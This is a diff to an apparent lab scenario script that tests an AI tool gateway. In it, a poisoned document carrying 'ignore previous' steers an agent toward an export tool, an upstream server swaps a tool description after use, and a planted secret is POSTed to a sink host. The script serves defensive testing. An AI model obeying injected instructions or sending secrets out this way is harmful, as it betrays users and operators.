@@ -8,9 +8,11 @@ leaves. The run token arrives in the environment, handed over by the lab runner.
 import asyncio
 import json
 import os
+import random
 import re
 import socket
 import sys
+import time
 from pathlib import Path
 from typing import Any
 
@@ -77,6 +79,7 @@ async def s3() -> dict[str, Any]:
     out["benign_via_proxy"] = via_proxy("GET", PARTNER, "/status")
     out["direct_sink"] = direct_connect(SINK)
     out["direct_sink_address"] = direct_connect(SINK_BY_ADDRESS)
+    out["exfil_started_at"] = time.time()
     out["exfil_via_proxy"] = via_proxy("POST", SINK, "/collect", planted_secret().encode())
     await asyncio.sleep(3)  # the gate reads the proxy's log twice a second
     out["gate_refuses_after"] = await refused_now()
@@ -84,18 +87,62 @@ async def s3() -> dict[str, Any]:
 
 
 async def s1() -> dict[str, Any]:
-    """A poisoned document leads the agent to the most tempting export tool, over HTTP."""
-    out: dict[str, Any] = {}
+    """A poisoned document leads the agent to the most tempting export tool, over HTTP.
+
+    The script counts its own steps and time, so the same run can be compared after the gate
+    has learned from it (scenario S5).
+    """
+    out: dict[str, Any] = {"steps": 0}
+    started = time.time()
     async with gate_client() as agent:
         names = [t.name for t in (await agent.list_tools()).tools]
+        out["steps"] += 1
         doc = await agent.call_tool("docs__read_document", {"name": "q3-report.txt"})
-        out["read_poisoned_document"] = "ignore previous" in str(doc.content[0].text).lower()  # type: ignore[union-attr]
-        target = next(n for n in names if ATTRACTIVE.search(n))
-        out["picked"] = target
-        reply = await agent.call_tool(target, {})
-        out["tarpit_reply_is_error"] = bool(reply.is_error)
+        out["steps"] += 1
+        text = str(doc.content[0].text) if doc.content else ""  # type: ignore[union-attr]
+        out["read_poisoned_document"] = "ignore previous" in text.lower()
+        out["document_withheld"] = bool(doc.is_error)
+        if out["read_poisoned_document"]:
+            target = next(n for n in names if ATTRACTIVE.search(n))
+            out["picked"] = target
+            out["export_started_at"] = time.time()
+            reply = await agent.call_tool(target, {})
+            out["tarpit_seconds"] = round(time.time() - out["export_started_at"], 2)
+            out["steps"] += 1
+            out["tarpit_reply_is_error"] = bool(reply.is_error)
+    out["seconds"] = round(time.time() - started, 2)
     out["gate_refuses_after"] = await refused_now()
     return out
+
+
+async def s2() -> dict[str, Any]:
+    """An upstream server swaps a tool's description after the agent has used it."""
+    out: dict[str, Any] = {}
+    async with gate_client() as agent:
+        out["before"] = await _call(agent, "wiki__echo", {"text": "hello"})
+        await _call(agent, "wiki__poison", {})
+        out["after"] = await _call(agent, "wiki__echo", {"text": "hello"})
+        out["tools_after"] = [t.name for t in (await agent.list_tools()).tools]
+    return out
+
+
+async def s0() -> dict[str, Any]:
+    """Fifty ordinary support sessions, one run token each. Nothing here is an attack."""
+    tokens = os.environ["HC_RUN_TOKENS"].split()
+    rng = random.Random(2026)
+    names = ["ana", "ben", "chitra", "dev", "esha", "farid", "gita", "hari", "isha", "jon"]
+    done = 0
+    for token in tokens:
+        os.environ["HC_RUN_TOKEN"] = token
+        async with gate_client() as agent:
+            await agent.list_tools()
+            for _ in range(rng.randint(2, 4)):
+                await agent.call_tool("crm__search_customers", {"query": rng.choice(names)})
+                await agent.call_tool("crm__get_customer", {"customer_id": rng.randint(1, 200)})
+            await agent.call_tool("docs__list_documents", {})
+            await agent.call_tool("docs__read_document", {"name": "notes.txt"})
+        done += 1
+    return {"sessions": done}
 
 
 async def _call(agent: Client, tool: str, args: dict[str, Any]) -> dict[str, Any]:
@@ -125,9 +172,9 @@ async def s4b() -> dict[str, Any]:
 
 def main() -> None:
     which = sys.argv[1] if len(sys.argv) > 1 else ""
-    scenarios = {"s1": s1, "s3": s3, "s4a": s4a, "s4b": s4b}
+    scenarios = {"s0": s0, "s1": s1, "s2": s2, "s3": s3, "s4a": s4a, "s4b": s4b}
     if which not in scenarios:
-        raise SystemExit("usage: python -m lab.scenarios.lab_agent s1|s3|s4a|s4b")
+        raise SystemExit("usage: python -m lab.scenarios.lab_agent s0|s1|s2|s3|s4a|s4b")
     print(json.dumps(asyncio.run(scenarios[which]())))
 
 
